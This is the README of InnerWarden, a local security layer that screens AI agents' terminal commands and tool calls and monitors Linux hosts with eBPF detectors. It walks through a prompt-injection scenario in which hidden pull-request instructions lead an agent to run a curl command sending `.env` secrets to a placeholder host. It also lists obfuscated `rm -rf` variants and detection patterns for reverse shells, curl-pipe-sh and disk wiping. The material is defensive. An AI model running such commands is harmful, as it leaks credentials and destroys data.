# InnerWarden

**Local safety layer for AI agents that can use the terminal.**

AI agents are starting to do real work: read files, run commands, install packages, call APIs, and touch servers. That is useful. It is also the moment a chatbot becomes something with operational power.

InnerWarden sits outside the agent, on the host it is using. Not a sandbox, not a prompt filter: it screens risky commands and MCP/tool traffic routed through its guard, watches the real Linux activity underneath with eBPF, blocks or flags dangerous behavior, and keeps the decision trail local. Its kernel Execution Gate (an eBPF LSM hook, inert by default) can make unauthorized binaries impossible to run, enforced below anything a hijacked agent can reach. No cloud control plane. Open source. Dry-run by default.

> Your agent reads a pull request, a web page, or a file with hidden instructions.
> It tries to read secrets, run an unsafe shell command, or connect somewhere it should not.
> InnerWarden catches the action before the damage leaves the box, then shows you what happened and why.

```bash
curl -fsSL https://innerwarden.com/install | sudo bash
```

Installs in 10 seconds. Starts in observe-only mode. Dry-run by default. You decide when to go live.

[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/InnerWarden/innerwarden/badge)](https://scorecard.dev/viewer/?uri=github.com/InnerWarden/innerwarden)
[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/12546/badge)](https://www.bestpractices.dev/projects/12546)
[![codecov](https://codecov.io/gh/InnerWarden/innerwarden/branch/main/graph/badge.svg)](https://codecov.io/gh/InnerWarden/innerwarden)
[![CI](https://github.com/InnerWarden/innerwarden/actions/workflows/ci.yml/badge.svg)](https://github.com/InnerWarden/innerwarden/actions/workflows/ci.yml)
[![Security](https://github.com/InnerWarden/innerwarden/actions/workflows/security.yml/badge.svg)](https://github.com/InnerWarden/innerwarden/actions/workflows/security.yml)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

![Built with Rust](https://img.shields.io/badge/built%20with-Rust-orange)
![eBPF Programs](https://img.shields.io/badge/eBPF%20programs-27%20loaded-blueviolet)
![Detectors](https://img.shields.io/badge/detectors-82-blue)
![Correlation Rules](https://img.shields.io/badge/correlation%20rules-69-purple)
![Tests](https://img.shields.io/badge/tests-9800%2B-brightgreen)
![MITRE Coverage](https://img.shields.io/badge/MITRE%20ATT%26CK-90%2B%20mappings-red)
![Sigma Rules](https://img.shields.io/badge/Sigma%20rules-209-blueviolet)
![Memory](https://img.shields.io/badge/memory-sensor%20~200MB%20%7C%20full%20stack%20~0.8GB-green)
![AI Optional](https://img.shields.io/badge/AI-optional-lightgrey)
![Storage](https://img.shields.io/badge/storage-SQLite%20WAL-blue)
![Graph](https://img.shields.io/badge/knowledge%20graph-11%20types%2C%2053%20relations-purple)

---

### Who is this for?

- **Developers and self-hosters** running AI agents that can edit code, call tools, or touch a shell
- **Founders and operators** who want to bring agents into real business workflows without "just trust the prompt" as the security plan
- **SREs and sysadmins** who manage Linux servers and want automated threat response, not just alerts
- **Security teams** who want kernel-level visibility (eBPF), MITRE ATT&CK coverage, local audit trails, and clear operator controls

### How is this different?

Prompt guardrails try to control what an agent says. InnerWarden controls what it actually does.

It lives where the action is: on the machine the agent can affect. Agent-facing checks can review commands and MCP tool calls before they run; host-level sensors still watch what actually executes. If the agent is tricked, the safety layer is not inside the thing being tricked. One binary, one SQLite database, no SIEM bundle, no external IDS, no cloud control plane. Two Rust daemons and a CLI.

**In plain terms, it does three things:**

- **Supervise.** It screens an agent's commands and MCP/tool calls *before* they run and returns allow, review, or block, scored against embedded Agent Threat Rules. The command check is shell-rewrite aware: obfuscation that fools a plain blocklist (`r''m -rf`, `rm$IFS-rf`, `$(echo rm)`) is normalized back to the real command before matching.
- **Watch.** It sees what actually executes on the host with eBPF, so if something slips past the polite guardrail it is still caught, on the real post-rewrite command.
- **Prove.** It records every decision locally in a tamper-evident audit trail. No cloud, your data never leaves the box.

Under the hood: 27 eBPF programs loaded (kernel-dependent), 82 detectors, 69 cross-layer correlation rules, 56 MITRE ATT&CK technique IDs (90+ detector mappings), and 9800+ tests gate every change. The full tour is further down: [what it does](#what-it-does), [what it detects](#what-it-detects), [how it works](#how-it-works).

<h3 align="center">
  <a href="https://innerwarden.com/live">See it responding to live network anomalies on our lab infrastructure</a>
</h3>

---

### Why this exists

I built InnerWarden because agents are going to do real work, and real work needs supervision. The same system that can catch a reverse shell at the kernel level, block an attacker, deploy a honeypot, and alert you on Telegram can also sit underneath an AI agent and ask a simpler question: "is this action safe to let through?"

Apache-2.0. If this project helps make agent automation safer to try, [give it a star](https://github.com/InnerWarden/innerwarden/stargazers) so others can find it.

---

## Architecture

<details>
<summary><b>Full layered architecture</b>: firmware (Ring -2) to kernel eBPF to sensor to agent to response. Click to expand.</summary>

```
┌─────────────────────────────────────────────────────────────────────┐
│                      FIRMWARE / BIOS (Ring -2)                      │
│  MSR write guard (LSTAR/SMRR) | ACPI method monitoring | ESP hash   │
│  SPI controller probing | eBPF weaponization detection (VoidLink)   │
└─────────────────────────────────────────────┬───────────────────────┘
                                              │
┌─────────────────────────────────────────────┼───────────────────────┐
│                      HYPERVISOR (Ring -1)   │                       │
│  VM introspection | KVM monitoring | VM exit analysis               │
└─────────────────────────────────────────────┼───────────────────────┘
                                              │
┌─────────────────────────────────────────────┼──────────────────────┐
│                           KERNEL (Ring 0)   │                      │
│                                                                    │
│  ┌───────────── ─┐  ┌────────────┐  ┌─────────┐  ┌───────────────┐ │
│  │23 tracepoints │  │ 10 kprobes │  │  5 LSM  │  │      XDP      │ │
│  │ execve,       │  │ creds,     │  │ exec    │  │  wire-speed   │ │
│  │ connect,      │  │ MSR, ACPI  │  │ file    │  │  IP blocking  │ │
│  │ openat,       │  │ timestomp  │  │ bpf     │  │  10M+ pps     │ │
│  │ mount, clone, │  │ truncate   │  │ + kill  │  │  allowlist +  │ │
│  │ ptrace, ...   │  │ + 7 raw_tp │  │ chain   │  │  blocklist    │ │
│  └──────┬─────── ┘  └─────┬──────┘  └───┬─────┘  └──────┬────────┘ │
│         └─ ───────┬───────┘            │               │           │
│                  ▼                     │               │           │
│           ┌─────────────┐              │               │           │
│           │ Ring Buffer │              │               │           │
│           │ (1MB epoll) │              │               │           │
│           └──────┬──────┘              │               │           │
└──────────────────┼────────────── ──────┼───────────────┼───────────┘
                   │                     │               │
                   ▼                     │               │
┌────────────────────────────────────────────────────────────────── ┐
│                         SENSOR                                    │
│                                                                   │
│  ┌─────────┐ ┌─────────┐ ┌────────┐ ┌────────────────────────┐    │
│  │auth.log │ │journald │ │ Docker │ │    eBPF collector      │◄─┘ |
│  │nginx    │ │syslog   │ │ cgroup │ │    (47 compiled)       │    |
│  └────┬────┘ └────┬────┘ └──┬──── ┘ └───────────┬────────────┘    │
│       │           │         │                   │                 │
│  ┌────┴────┐ ┌────┴─────┐ ┌─┴──────────────┐    │                 │
│  │DNS/HTTP │ │TLS/JA3   │ │kernel_integrity│    │                 │
│  │capture  │ │JA4       │ │proc_maps       │    │                 │
│  │(native) │ │(native)  │ │fanotify        │    │                 │
│  └────┬────┘ └────┬─────┘ └───────┬────────┘    │                 │
│       └───────────┴───────────────┴─────────────┘                 │
│                          │                                        │
│                    ┌─────▼──────┐                                 │
│                    │82 detectors│ + 8 YARA + 209 Sigma (+9 built-in)│
│                    │ stateful   │                                 │
│                    └─────┬──────┘                                 │
│                          │                                        │
│              ┌───────────▼───────────┐                            │
│              │  events + incidents   │                            │
│              │     (SQLite WAL)      │                            │
│              └───────────┬───────────┘                            │
└──────────────────────────┼────────────────────────────────────────┘
                           │
┌──────────────────────────┼────────────────────────────────────────┐
│                   AGENT  │                                        │
│                          ▼                                        │
│   ┌───────────────────────────────────────────────────────────┐   │
│   │              Knowledge Graph (in-memory)                  │   │
│   │  11 node types (Process, IP, File, User, Domain, ...)     │   │
│   │  53 relation types | 28 graph detectors | 10 graph rules  │   │
│   │  Autoencoder anomaly scoring (65 features)                │   │
│   └────────────────────────┬──────────────────────────────────┘   │
│                            ▼                                      │
│     ┌──────────────────────────────────────────────┐              │
│     │  69 Cross-Layer Correlation Rules            │              │
│     │  + Kill Chain Tracker (7 stages per entity)  │              │
│     │  + Threat DNA behavioral fingerprinting      │              │
│     └────────────────────┬─────────────────────────┘              │
│                          ▼                                        │
│                ┌──────────────────┐                               │
│                │  Algorithm Gate  │  skip low-sev, private IP     │
│                └────────┬─────────┘                               │
│                         ▼                                         │
│              ┌────────────────────┐                               │
│              │ Enrich: AbuseIPDB, │                               │
│              │ GeoIP, CrowdSec    │                               │
│              └────────┬───────────┘                               │
│                       ▼                                           │
│              ┌──────────────────────┐                             │
│              │   Local Warden       │  on-device ONNX classifier  │
│              │   (opt-in via        │  ~91 MB, 61 ms p50; routes  │
│              │    install-warden,   │  Decide on-device when      │
│              │    warden default)   │  installed by default now   │
│              └──────────┬───────────┘                             │
│                         ▼                                         │
│              ┌─────────────────────┐                              │
│              │ AI Triage (opt LLM) │  OpenAI / Anthropic / Ollama │
│              └────────┬────────────┘  via AI Capability Router    │
│                       ▼                                           │
│              ┌─────────────────┐     ┌──────────────┐             │
│              │ Skill Executor  │────►│ LSM enforce  │             │
│              │ block_ip (6)    │     │ XDP block    │             │
│              │ kill_process    │     └──────────────┘             │
│              │ suspend_sudo    │     ┌──────────────┐             │
│              │ honeypot        │────►│ Cloudflare   │             │
│              │ playbooks (3)   │     │ AbuseIPDB    │             │
│              └────────┬────────┘     └──────────────┘             │
│                       │                                           │
│          ┌────────────┼────────────┬──────────────┐               │
│          ▼            ▼            ▼              ▼               │
│   ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────┐         │
│   │ Telegram │ │  Slack   │ │ Webhook  │ │ Mesh Network │         │
│   │   bot    │ │          │ │ (any)    │ │ peer defense │         │
│   └──────────┘ └──────────┘ └──────────┘ └──────────────┘         │
│                                                                   │
│   ┌───────────────────────────────────────────────────────────┐   │
│   │  innerwarden.db (SQLite WAL)                              │   │
│   │  Events, incidents, decisions, graph snapshots, KV state, │   │
│   │  attacker profiles, baselines | Hash chain audit trail    │   │
│   └───────────────────────────────────────────────────────────┘   │
│                                                                   │
│   ┌───────────────────────────────────────────────────────────┐   │
│   │ Dashboard: HUD, threats, investigation, attacker intel,   │   │
│   │ MITRE ATT&CK map, monthly reports, baseline learning,     │   │
│   │ ISO 27001 compliance, hash chain, live SSE, audit trail,  │   │
│   │ drift metrics, trust scores, regression scenario gates    │   │
│   └───────────────────────────────────────────────────────────┘   │
└───────────────────────────────────────────────────────────────────┘
```

</details>

**Runtime layers between the AI Triage and the notification channels above:**

- **Notification gate** — every channel (Telegram, Slack, Webhook, Push) goes through a single policy that returns `SendNow` / `DailyBriefingOnly` / `Drop`. Burst summary collapses 50+/h auto-blocks into one "all handled" message.
- **Graduated enforcement** — state machine promotes a responder from `Observe` → `Warn` → `Contain` → `Enforce` based on continuous trust scoring and AI SOC daily checks (11 system parsers).
- **Observation verification** — behavioural score engine + AI batch verification clears active false positives instead of leaving them to rot.
- **Regression safety net** — `make scenario-qa` asserts volume envelopes for 7 canonical scenarios; 10 drift metrics exported on `/metrics`.
- **Structured subgraph prompt** (opt-in) — when `ai.use_structured_subgraph = true`, the LLM receives the graph context as JSON nodes/edges instead of prose (measured +20pp action accuracy on qwen2.5:3b).

---

## What it does

1. **Guards agent actions**: agents and tool runners can call the local command-check API before acting, or route MCP tool calls through the inspecting proxy. Commands are scored against embedded Agent Threat Rules (ATR), risky actions can be denied or sent for review, and the host layer still verifies what actually ran.
2. **Watches**: 32 collectors across every layer - eBPF syscall tracing (27 kernel programs loaded, kernel-dependent), firmware integrity, memory forensics (/proc/maps RWX), native DNS/HTTP/TLS (JA3/JA4) capture, tunnel-interface monitoring (a new tun/WireGuard interface = a mesh-VPN brought up), real-time filesystem, cgroup, kernel integrity, plus auth.log, journald, Docker, nginx, CloudTrail. (Full collector list under [How it works](#how-it-works).)
3. **Detects**: 82 stateful detectors + 8 YARA malware rules + 9 built-in Sigma rules + 209 community Sigma rules cover the full attack lifecycle — brute-force/credential stuffing, C2 (incl. ngrok/cloudflared/bore + mesh-VPN tunnels + DNS/ICMP/SSH-forward), privilege escalation, container escape, reverse shells (eBPF sequence, impossible to evade), ransomware, rootkits, exfiltration, persistence, defense evasion, data destruction, and more. **56 MITRE ATT&CK technique IDs** (90+ detector→technique mappings) across 12 ATT&CK tactics. (The per-detector table with MITRE IDs is in [What it detects](#what-it-detects).)
4. **Correlates**: 69 cross-layer rules connect Firmware × Kernel × Userspace × Network × Honeypot events. Baseline anomalies, neural scores, and DDoS shield state all feed the correlation engine. Detects multi-stage attacks no single detector can see: firmware tampering → rootkit install, recon → brute force → data exfil, honeypot engagement → real attack on same IP, Discovery → Privesc → Lateral Movement chains, full kill chain Initial Access → Foothold → Persistence → Defense Evasion → Impact. The kill chain tracker tracks 7 attack stages per entity (IP, user, container).
5. **Learns**: baseline anomaly detection trains for 7 days then alerts on deviations — event rate drops (silence = compromise), new process lineages (nginx→sh), unusual login times, unknown network destinations. No rules needed.
6. **Responds**: high/critical incidents drive response skills (block IP via XDP/UFW/iptables/nftables, suspend sudo, kill process, pause container, honeypot redirect). XDP drops attack traffic at wire speed. **Optional** in-kernel execution enforcement (LSM Execution Gate — inert by default, requires explicit arming + setup) stops reverse shells and /tmp execution before they run. Blocks propagate to mesh peers.
7. **Responds automatically** — *once you opt in. Every install ships in observe mode (`responder.enabled = false` + `dry_run = true`); you must flip both before any action fires, and nothing flips them for you ([details](#start-in-observe-mode-always)).* The AI decision path then drives response skills directly (block IP via ufw/iptables/nftables/firewalld/XDP, suspend sudo, kill process, pause container, honeypot redirect, capture forensics + pcap, notify, escalate). On top of that, 3 built-in SOC playbook templates ship (data exfil, Log4Shell, credential stuffing) that you extend with your own YAML and turn on with `[playbooks] enabled` (opt-in, off by default)
8. **Fingerprints attackers**: behavioral DNA (SHA-256 of detectors + tools + targets + timing patterns), **cross-IP tracking** (same attacker detected across VPN/Tor rotations via fuzzy DNA matching — risk score and detector knowledge inherited automatically), campaign detection via IOC clustering, recurrence tracking, risk scoring 0-100, monthly threat reports with MITRE heatmap

Everything is local, audited, and reversible.

---

## What happens when an agent is tricked

```
00:00  Your AI agent reads a pull request with hidden instructions
00:01  The agent tries to run: curl https://example.bad/leak?token=$(cat .env)

       Agent guard evaluates: "secret read + outbound exfil"
       ATR match: credential_exfiltration
       Recommendation: deny

00:01  Tool call / command is blocked or held for review
00:01  eBPF/audit trail records what actually happened on the host
00:01  Telegram alert lands on your phone

       The agent keeps working. The dangerous action does not.
```

The same host-defense layer still protects the server itself. If someone brute-forces SSH at 2 AM, InnerWarden can detect the attack, block the IP, capture the session, deploy a honeypot, and send you a report before you wake up.

No human needed when auto-execution is enabled. Otherwise, you approve via Telegram or the dashboard. Full audit trail. Every action reversible.

---

## Response skills

When a threat is confirmed, InnerWarden picks the right tool.

| Skill | What it does |
|-------|-------------|
| **Block IP (XDP)** | Wire-speed drop at the network driver, 10M+ packets/sec, zero CPU overhead |
| **Block IP (firewall)** | Deny via ufw, iptables, nftables, firewalld (RHEL/Rocky/Fedora), or pf (macOS). Persists across reboots. |
| **SOC playbook** | Run an operator-authored response sequence (declarative steps, virtual skills) with precedence before the auto-handle gate. Shadow mode validates on-host without acting; `innerwarden playbook test` simulates. Log4Shell playbook ships built-in. |
| **Suspend sudo** | Revokes sudo for a user via sudoers drop-in. Auto-expires after TTL. |
| **Kill process** | Terminates all processes for a compromised user. TTL-bounded. |
| **Block container** | Pauses a Docker container. Auto-unpauses after TTL. |
| **Deploy honeypot** | SSH/HTTP decoy with tiered authentication (rejects single-shot scanners, accepts Mirai-class bots on known-weak credentials, adaptive accept on 3+ unique guesses to catch human-direct attackers) and LLM-powered interactive shell. OpenSSH banner masquerade so scanners don't fingerprint it. Captures credentials, commands, and IOCs. |
| **Rate limit nginx** | Blocks abusive HTTP traffic at the nginx layer with TTL |
| **Monitor IP** | Bounded tcpdump capture for forensic analysis |
| **Block IP (Cloudflare)** | Edge-level blocking via Cloudflare API, stops traffic before it reaches your server |
| **Report to AbuseIPDB** | Shares attacker IPs with community threat intelligence |
| **Kill chain response** | Kills process tree + blocks C2 IP via XDP + captures forensics (ss, /proc) |

Blocking is **layered**: a single block decision triggers XDP (instant kernel drop) + firewall (persists reboot) + mesh broadcast (peer nodes block too) + Cloudflare edge (stops traffic upstream) + AbuseIPDB report (community intelligence). Kill chain incidents trigger the `kill-chain-response` skill: kill process tree + block C2 via XDP + capture forensics. All skills are bounded, audited, and reversible.

### Posture-aware alerting (v0.13.1)

InnerWarden snapshots your host's defensive posture every 10 minutes (sshd config, sudoers, services, firewall) and downgrades incident severity for attack vectors the host already neutralised. An `ssh_bruteforce` against a host with `PasswordAuthentication=no` becomes Low instead of High; the operator stops getting paged for things the kernel was always going to refuse anyway. Hard invariant: never demote when the attacker actually established a session, executed a process, or wrote a file. Read the live posture via `innerwarden get posture` or the dashboard panel; ask Telegram with `/posture`.

### Honeypot that actually traps (v0.13.1)

With `[honeypot] interaction = "llm_shell"` (the default is a low-interaction `banner`), the honeypot runs a tiered SSH listener that:

- Rejects the first 2 password attempts unconditionally so single-shot credential scanners disconnect with cred-only intel.
- Then accepts ONLY when `(user, password)` matches a curated list of Mirai canonical defaults + classic root defaults + appliance defaults. This is what makes a real dropper bot open the shell and run its payload.
- After 3 distinct guesses on a single connection, accepts adaptively to catch human-direct attackers typing org-specific passwords.
- Masquerades as `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6` so scanners don't fingerprint the listener.
- Drops the trapped payload commands + IOCs into the dashboard's Honeypot tab, paginated and engaged-only by default.

### Decision review &amp; human escalation (v0.15.0)

The real Autonomy Gap: an incident the Local Warden is not confident about, that no deterministic gate resolves, used to leak silently to an orphan-recovery sweep that auto-dismissed it ~1h later. v0.15.0 replaces that leak with an explicit, honest loop — trivial noise is suppressed without asking; anything weighty routes to **`needs_review`**, notifies the operator (Telegram with inline **Block / Ignore / Dismiss** buttons), and on timeout auto-resolves Low/Medium with an honest note while High/Critical re-notify and **never** silently auto-dismiss. Every human decision feeds a warden retrain label channel; mesh peers corroborate suppression. Every path has a deterministic fallback — the LLM is an enhancement, never a dependency. An already-blocked IP no longer churns the decide/re-block loop (spec 066). Read `innerwarden get decisions`; configure under `[observation]` / `[responder]`.

---

## What it detects

82 stateful detectors + 8 YARA rules + 9 built-in Sigma rules + 209 community Sigma rules covering the full attack lifecycle. **56 unique MITRE ATT&CK technique IDs (90+ detector→technique mappings) across 12 ATT&CK tactics.** Highlights:

| Detector | Threat | MITRE |
|----------|--------|-------|
| `ssh_bruteforce` | Repeated SSH failures from one IP | T1110.001 |
| `credential_stuffing` | Many usernames tried from one IP | T1110.004 |
| `distributed_ssh` | Coordinated botnet scan: many IPs, few attempts each | T1110 |
| `suspicious_login` | Brute-force followed by successful login = compromise | T1110 |
| `port_scan` | Rapid unique-port probing | T1595 |
| `reverse_shell` | Reverse/bind shell detection via eBPF + behavioral analysis | T1059 |
| `execution_guard` | Suspicious shell commands via AST analysis | T1059 |
| `process_tree` | Suspicious parent-child: web server → shell, Java RCE | T1059 |
| `privesc` | Real-time privilege escalation via eBPF kprobe on `commit_creds` | T1068 |
| `suid_page_cache_integrity` | SUID-root binary page-cache SHA divergence (Copy Fail / Dirty Frag / Fragnesia class) | T1014 / T1068 |
| `rootkit` | Kernel module and userland rootkit detection | T1014 |
| `ransomware` | Rapid file encryption, ransom note creation, extension changes | T1486 |
| `c2_callback` | Beaconing, C2 port connections, data exfiltration patterns | T1071 |
| `dns_tunneling` | Encoded DNS queries for covert data transfer | T1071.004 |
| `container_escape` | nsenter, Docker socket access, host file reads from container | T1611 |
| `lateral_movement` | SSH pivoting, credential reuse across hosts | T1021 |
| `crypto_miner` | CPU abuse from mining processes | T1496 |
| `web_scan` | HTTP error floods, path traversal, LFI probing | T1190 |
| `web_shell` | Web shell upload and command execution | T1505.003 |
| `data_exfiltration` | Large outbound transfers, DNS exfil, staging patterns | T1048 |
| `fileless` | In-memory execution, /proc/self/mem writes | T1055 |
| `log_tampering` | Log deletion, truncation, timestomping | T1070 |
| `kernel_module_load` | Unauthorized kernel module insertion | T1547.006 |
| `sudo_abuse` | Burst of privileged commands by a user | T1548 |
| `integrity_alert` | Changes to /etc/passwd, /etc/shadow, sudoers, SSH keys | T1098 |
| `packet_flood` | DDoS / volumetric attack detection | - |
| `user_agent_scanner` | Known scanner signatures (Nikto, sqlmap, Nuclei, 20+) | T1595.002 |
| `nmap_scan` / `wordlist_scan` / `discovery_anomaly` | Network/dir/host enumeration with context-aware silencing of operator activity | T1046 / T1595.001 / T1595.003 / T1018 |
| `clipboard_read` / `screen_capture` / `archive_pwd_protected` / `automated_file_collection` | Collection-stage attacker tools (xclip/xsel, scrot/maim, zip -P, mass tar/find) | T1115 / T1113 / T1560.001 / T1119 |
| `c2_web_tunnel` / `c2_protocol_tunneling` / `c2_non_standard_port` | ngrok/cloudflared/bore tunnels, DNS/ICMP/SSH-forward tunneling, listeners outside well-known ports | T1090.003 / T1572 / T1071.004 / T1571 |
| `setuid_exploit_pattern` / `capabilities_abuse` | Non-baseline SUID exec by non-root, dangerous Linux-capability + exploitation argv pairing | T1548.001 / T1068 / T1548.005 |
| `lateral_egress_ssh` / `lateral_egress_scp_rsync` | Outbound `ssh` from non-operator-shell tree, scp/rsync staging user-data dirs to remote | T1021.004 / T1029 / T1048.001 |
| `pam_module_change` / `startup_script_persistence` | PAM config/module tampering, RC script persistence (/etc/rc.local, /etc/init.d/, /etc/cron.d/) | T1556.003 / T1037.004 |
| `auditd_disable` / `selinux_apparmor_disable` | Stopping audit subsystem, disabling SELinux/AppArmor MAC | T1562.001 |
| `data_destruction_pattern` | rm -rf user data, disk wipe via dd, shred burst, mkfs on running volume, cryptsetup luksFormat | T1485 / T1561.001 / T1486 |
| **`symlink_hijack`** | Symlink/hardlink naming /etc/shadow, /etc/sudoers, /etc/pam.d/*, ~/.ssh/authorized_keys | T1555 / T1574.005 |
| **`system_user_interactive`** | Service accounts (www-data, nobody, postgres, …) running interactive shells with tty or sshd parent | T1059 / T1078.003 |

Plus: `docker_anomaly`, `search_abuse`, `credential_harvest`, `ssh_key_injection`, `user_creation`, `crontab_persistence`, `systemd_persistence`, `process_injection`, `outbound_anomaly`, `data_exfil_ebpf` (sensitive file read → outbound connect by PID), `keylogger_bash_trap` (shell startup file tampering + trap-DEBUG patterns), `yara_scan` (8 built-in rules: XMRig, webshells, Cobalt Strike, Metasploit, rootkits), `sigma_rule` (8 built-in rules: cron modification, /tmp execution, shadow access, docker.sock; plus 209 community rules auto-loaded from `rules/sigma/`), `cgroup_abuse` (CPU/memory resource abuse), `io_uring_anomaly`, `container_drift`, `host_drift`, `sensitive_write`.

`execution_guard` parses commands structurally using tree-sitter-bash. It catches `curl | sh` pipelines, `/tmp` execution, reverse shell patterns, and staged download-chmod-execute sequences.

`c2_callback` uses coefficient-of-variation analysis to detect beaconing: regular-interval connections to the same IP that indicate a compromised process phoning home.

`privesc` hooks the kernel's `commit_creds` function via kprobe. When a non-root process gains root through an unexpected path (not sudo/su/login), a Critical incident fires instantly, before any log is written.

---

## How it works

**Sensor**: deterministic signal collection. No AI, no HTTP. 32 collectors (auth.log, journald, Docker events, file integrity, firmware integrity, nginx access/error, shell audit, macOS unified log, Windows Event Log (ETW), syslog firewall, eBPF syscall tracing with 27 kernel programs loaded (kernel-dependent), JA3/JA4 TLS fingerprinting, memory forensics via /proc/maps, real-time filesystem monitoring with entropy analysis, kernel integrity monitoring, cgroup resource abuse detection, SUID inventory, systemd unit inventory, sysctl drift, kernel audit state monitoring (alerts when the audit subsystem is disabled, T1562.001), tunnel-interface monitoring (new tun/WireGuard interface = mesh-VPN persistence, rename-proof), USB attach/detach, AWS CloudTrail). Events flow through a unified SQLite database (WAL mode) or Redis Streams to the agent. Syslog CEF output for SIEM integration. **9800+ unit tests** with **665 named anchors** (see [ANCHOR_TESTS.md](ANCHOR_TESTS.md)) gate every change before it can merge.

**eBPF**: 47 kernel programs compiled, 27 loaded in prod (kernel-dependent). Linux 5.8+, CO-RE/BTF portable:
- **23 tracepoints**: execve, connect, openat, ptrace, setuid, bind, mount, memfd_create, init_module, dup2/dup3, listen, mprotect, clone, unlinkat, renameat2, kill, prctl, accept4, sched_process_exit, ioperm, iopl, io_uring_submit, io_uring_create
- **10 kprobes**: `commit_creds` (privilege escalation), `native_write_msr` (firmware MSR tampering), `acpi_evaluate_object` (ACPI rootkit detection), `do_truncate` (log tampering), plus 6 timing-based rootkit kprobes (Trace of the Times: iterate_dir, filldir64, tcp4_seq_show, proc_pid_readdir kprobe/kretprobe pairs)
- **5 LSM kernel-block hooks** (Spec 052/053 + PR-A/B/C/D): `bprm_check_security` (exec blocking via PID→BLOCKED_PIDS map populated by kill chain detector), `userns_create` (container escape — blocks `unshare(CLONE_NEWUSER)` from chain-flagged PIDs), `ptrace_access_check` (process injection — blocks PTRACE_ATTACH/POKETEXT), `bpf_prog` (VoidLink defence — blocks malicious BPF program loads), `mmap_file` (real-time RWX block, replacing 5s `proc_maps` polling). Plus 2 legacy hooks (`file_open`, `bpf`) kept in parallel. All FP-free by design: legitimate users (Chrome sandbox, gdb, JIT compilers, systemd) pass through because they're never in BLOCKED_PIDS.
- **Execution Gate primitive (opt-in, inert by default)**: a dedicated `bprm_check_security` LSM program (`innerwarden_lsm_exec_gate`) that can enforce a binary allowlist by path-hash — denying any executable whose path is not on the allowlist with `-EPERM`. It ships **inert** (`LSM_POLICY` key 3 = 0): visible and auditable in the sensor source, but enforcing nothing. A **free** CLI arms it safely around your own AI agent, agent-scoped so the host is never gated: `innerwarden exec-gate arm --pid <agent> --observe` (log-only, never denies) → `exec-gate rehearse --pid <agent>` (see exactly what it would block) → allowlist those binaries → `exec-gate enforce --pid <agent>` (deny unknown execs in that one cgroup — only after a clean, zero-would-block rehearsal) → `exec-gate disarm`. Still nothing is armed for a default install — the gate stays inert until you run `arm`.
- **XDP program**: wire-speed IP blocking at the network driver (10M+ pps drop rate)
- **Phase 2 firmware hooks**: MSR write guard (LSTAR/SMRR), I/O port access (SPI controller probing), ACPI method execution monitoring

> **Looking for the eBPF source code?** All 47 kernel programs live in a single file: [`crates/sensor-ebpf/src/main.rs`](crates/sensor-ebpf/src/main.rs).

**Kernel-level noise filters** keep overhead near zero: COMM_ALLOWLIST (137 trusted processes like sshd, systemd, docker), CGROUP_ALLOWLIST, PID_RATE_LIMIT, and PID_CHAIN. Tail call dispatcher routes events through a single attach point to N handlers via ProgramArray. Ring buffer with epoll wakeup delivers events in microseconds.

**DDoS defense**: 4-layer adaptive protection. XDP kernel drop (wire speed) + Shield module (dynamic rate limiting) + Cloudflare auto-failover (edge blocking) + Nginx rate limit. Rate limits tighten dynamically under attack.

**Mesh network**: collaborative defence between nodes. Attack one server, and all others block the IP automatically. Ed25519 signed signals, game-theory trust model (tit-for-tat), staging pool with TTL-based auto-reversal. No signal causes immediate action. Everything is scored and staged.

```bash
innerwarden config mesh enable
innerwarden config mesh add-peer https://peer-server:8790
```

Container-aware via cgroup ID. Zero performance overhead.

**Agent**: reads incidents from SQLite or Redis Streams. Fast loop (2s): algorithm gate → already-blocked / needs-review routing → enrichment (AbuseIPDB, GeoIP, CrowdSec, DShield, threat feeds) → VirusTotal hash check on YARA matches → SOC playbooks → AI triage → skill execution → pcap capture on High/Critical → audit trail. Slow loop (30s): cross-layer correlation (69 rules) → baseline learning → attacker intelligence consolidation (DNA + campaigns) → decision-review timeout sweep → monthly report generation → narrative summary. Auto-restart is handled by the OSS `innerwarden-supervisor` (rate-limited, `/metrics` health probe, Telegram alerts).

Two Rust daemons. No external dependencies. Measured production RSS (full stack): roughly **0.7–0.8 GB** with all features active — the always-on sensor is ~160–220 MB on its own, and the agent is ~400–650 MB once the on-device AI classifier (~150 MB) and inline modules are loaded. AI is optional: detection-only stays near the sensor footprint. Single SQLite database. (Reproduce with `scripts/memory-profile.sh`.) Dashboard with 9 views: Sensors HUD, Threats investigation, Report, Health, Honeypot, Compliance (ISO 27001), Intelligence (Profiles, Campaigns, Chains, Baseline), Monthly Report. Live SSE feed, MITRE ATT&CK mapping, 20 integration cards. Sleeps after 15 min of inactivity.

---

## AI is optional and controlled

InnerWarden detects and logs threats without any AI provider. Add AI when you want:

- **Confidence-scored recommendations**: not binary yes/no, but 0.0-1.0 scored decisions
- **Policy-gated execution**: AI recommends, your policy decides if it runs
- **Full transparency**: every AI decision is recorded in an append-only audit trail with reasoning
- **Twelve providers**: OpenAI, Anthropic, Ollama (local), OpenRouter, Groq, Together, Mistral, DeepSeek, Fireworks, Cerebras, Google Gemini, xAI Grok

AI is advisory unless you explicitly enable auto-execution. You set the confidence threshold.

---

## Operator in the loop

Not everything should be automatic.

- **Telegram**: every High/Critical incident pushed to your phone. Approve or deny with inline buttons. Sensitivity control: quiet/normal/verbose.
- **Slack**: incident notifications via incoming webhook
- **Webhook**: HTTP POST to any endpoint. Works with PagerDuty, Opsgenie, Discord, Microsoft Teams, Google Chat, DingTalk, Feishu/Lark, WeCom, n8n, Zapier, Make, Home Assistant.
- **Dashboard**: local authenticated UI with sensor HUD, investigation timeline, entity search, operator actions, live SSE feed, attack map, MITRE ATT&CK mapping, attacker path viewer, 20 integration cards, ISO 27001 compliance tab with hash chain verification

---

## Safe defaults

InnerWarden ships with the safest possible posture. On first run, **nothing is blocked, killed, or modified**. The system only observes and logs.

| Default | Meaning |
|---------|---------|
| `responder.enabled = false` | No actions taken. Observe only. |
| `dry_run = true` | Logs what it *would* do, without doing it. |
| `execution_guard` in observe mode | Detects suspicious commands, does not block. |
| Shell audit opt-in | Requires explicit privacy consent. |
| AI optional | Detection and logging work without any provider. |
| Append-only audit trail | Every decision stored in SQLite with full reasoning. |

You must explicitly change **two settings** before any response action can fire: enable the responder and disable dry-run. Neither happens automatically.

## Start in observe mode. Always.

